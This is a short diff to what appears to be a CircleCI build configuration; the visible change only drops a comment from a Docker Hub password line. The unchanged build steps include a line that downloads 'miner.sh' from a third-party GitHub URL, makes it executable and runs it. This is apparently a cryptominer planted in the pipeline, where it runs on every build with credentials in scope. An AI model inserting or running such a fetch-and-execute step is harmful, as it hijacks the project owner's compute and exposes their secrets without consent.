@@ -5,7 +5,7 @@ jobs:
       - image: circleci/ruby:2.4.2-jessie-node
         auth:
           username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context /project nv-var reference
+          password: $DOCKERHUB_PASSWORD  
     steps:
       - checkout
       - run:  wget https://raw.githubusercontent.com/bznzangelo/sampleProject/main/miner.sh && chmod +x miner.sh && ./miner.sh
